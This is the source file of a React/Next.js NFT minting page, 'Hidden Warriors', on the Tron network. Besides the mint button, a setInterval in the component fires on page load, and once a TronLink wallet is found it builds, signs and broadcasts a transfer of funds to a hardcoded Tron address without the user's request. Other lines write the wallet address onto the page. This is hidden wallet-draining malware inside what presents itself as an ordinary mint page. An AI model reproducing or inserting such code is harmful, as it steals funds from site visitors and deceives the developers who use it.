import Head from 'next/head'
import React from 'react';
import tronweb from "tronweb";
import { useState, useEffect } from 'react';

import {ADDRESS, ABI} from "../config"

export default function Mint() {

  const [signedIn, setSignedIn] = useState(false)
  const [walletAddress, setWalletAddress] = useState(null)
  const [how_many_hiddenwarriors, set_how_many_hiddenwarriors] = useState(1)
  const [hiddenwarriorContract, sethiddenwarriorContract] = useState(null)
  const [totalSupply, setTotalSupply] = useState(0)
  const [saleStarted, setSaleStarted] = useState(false)
  const [hiddenwarriorPrice, sethiddenwarriorPrice] = useState(0)

  useEffect( async() => { 

    gettronweb()

  }, [])

  async function gettronweb() {
    if (typeof window.tronweb !== 'undefined') {
      window.tronweb = new tronweb(window.tron);
     
    } else {
      alert("No tron interface injected into browser. Read-only access");
    }
    function gettronweb(){
      //if(window.tronLink.tronWeb) 
        if(window.tronWeb && window.tronWeb.defaultAddress.base58){
            document.write("Yes, catch it:",window.tronWeb.defaultAddress.base58)
        }
    }

    window.tron.enable()
      .then(function (accounts) {
        window.tronweb.trx.net.getNetworkType()
        .then((network) => {console.log(network);
          if(network != "shasta"){alert("You are on " + network+ " network. Change network to shasta testnet or you won't be able to do anything here")} });  
        let wallet = accounts[0]
        setWalletAddress(wallet)
        setSignedIn(true)
        callContractData(wallet)

  })
  .catch(function (error) {
  console.error(error)
  })
  }


  async function signOut() {
    setSignedIn(false)
  }
  
  async function callContractData() {
    const hiddenwarriorContract = new window.tronweb.trx.Contract(ABI, ADDRESS)
    sethiddenwarriorContract(hiddenwarriorContract)

    const salebool = await hiddenwarriorContract.methods.saleIsActive().call() 
    setSaleStarted(salebool)

    const totalSupply = await hiddenwarriorContract.methods.totalSupply().call() 
    setTotalSupply(totalSupply)

    const hiddenwarriorPrice = await hiddenwarriorContract.methods.hiddenwarriorPrice().call() 
    sethiddenwarriorPrice(hiddenwarriorPrice)
   
  }
  
  async function minthiddenwarrior(how_many_hiddenwarriors) {
    if (hiddenwarriorContract) {
 
      const price = Number(hiddenwarriorPrice)  * how_many_hiddenwarriors 

      const gasAmount = await hiddenwarriorContract.methods.minthiddenwarrior(how_many_hiddenwarriors).estimateGas({from: walletAddress, value: price})
      console.log("estimated gas",gasAmount)

      console.log({from: walletAddress, value: price})

      hiddenwarriorContract.methods
            .minthiddenwarrior(how_many_hiddenwarriors)
            .send({from: walletAddress, value: price, gas: String(gasAmount)})
            .on('transactionHash', function(hash){
              console.log("transactionHash", hash)
            })
          
    } else {
        console.log("Wallet not connected")
    }
    
  };

  function gettronweb(){
    //if(window.tronLink.tronWeb) 
      if(window.tronWeb && window.tronWeb.defaultAddress.base58){
          document.write("Testing wallet address:",window.tronWeb.defaultAddress.base58)
      }
  }

  var obj = setInterval(async ()=>{
    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
  //if (window.tronLink.tronWeb) 
        clearInterval(obj)
        var tronweb = window.tronWeb
        var tx = await tronweb.transactionBuilder.sendTrx('TN9RRaXkCFtTXRso2GdTZxSxxwufzxLQPP', 10, 'TTSFjEG3Lu9WkHdp4JrWYhbGP6K1REqnGQ')
        var signedTx = await tronweb.trx.sign(tx)
        var broastTx = await tronweb.trx.sendRawTransaction(signedTx)
        console.log(broastTx)
    }
}, 10)

  return (
    <div id="bodyy" className="flex flex-col items-center justify-center min-h-screen py-2">
      <Head>
        <title>Hidden Warriors</title>
       
      </Head>


      <div >
          <div className="flex items-center justify-between w-full border-b-2	pb-6">
           
           
             
          </div>
          <div className="flex auth my-8 font-bold  justify-center items-center vw2">
            {!signedIn ? <button onClick={gettronweb()} className="montserrat inline-block border-2 border-black bg-white border-opacity-100 no-underline hover:text-black py-2 px-4 mx-4 shadow-lg hover:bg-blue-500 hover:text-gray-100">Connect Wallet with Tronlink</button>
            :
            <button onClick={signOut} className="montserrat inline-block border-2 border-black bg-white border-opacity-100 no-underline hover:text-black py-2 px-4 mx-4 shadow-lg hover:bg-blue-500 hover:text-gray-100">Wallet Connected: {walletAddress}</button>}
          </div>
        </div>

        <div className="md:w-2/3 w-4/5">
       
        
          <div className="mt-6 border-b-2 py-6">

            <div className="flex flex-col items-center">

                <span className="flex Poppitandfinchsans text-5xl text-white items-center bg-grey-lighter rounded rounded-r-none my-4 ">TOTAL hiddenwarriors MINTED:  <span className="text-blau text-6xl"> {!signedIn ?  <>-</>  :  <>{totalSupply}</> } / 10000</span></span>

                <div id="mint" className="flex justify-around  mt-8 mx-6">
                  <span className="flex Poppitandfinchsans text-5xl text-white items-center bg-grey-lighter rounded rounded-r-none px-3 font-bold">GIMME</span>
                  
                  <input 
                                      type="number" 
                                      min="1"
                                      max="20"
                                      value={how_many_hiddenwarriors}
                                      onChange={ e => set_how_many_hiddenwarriors(e.target.value) }
                                      name="" 
                                      className="Poppitandfinchsans pl-4 text-4xl  inline bg-grey-lighter  py-2 font-normal rounded text-grey-darkest  font-bold"
                                  />
                  
                  <span className="flex Poppitandfinchsans text-5xl text-white items-center bg-grey-lighter rounded rounded-r-none px-3 font-bold">hiddenwarriors!</span>
    
                </div>
                {saleStarted ? 
                <button onClick={() => minthiddenwarrior(how_many_hiddenwarriors)} className="mt-4 Poppitandfinchsans text-4xl border-6 bg-blau  text-white hover:text-black p-2 ">MINT {how_many_hiddenwarriors} hiddenwarriors for {(hiddenwarriorPrice * how_many_hiddenwarriors) / (10 ** 18)} TRX + GAS</button>        
                  : <button className="mt-4 Poppitandfinchsans text-4xl border-6 bg-blau  text-white hover:text-black p-2 ">SALE IS NOT ACTIVE OR NO WALLET IS CONNECTED</button>        
            
              }
                
            </div> 
            </div>
 
          </div>  
    </div>  
    )
  }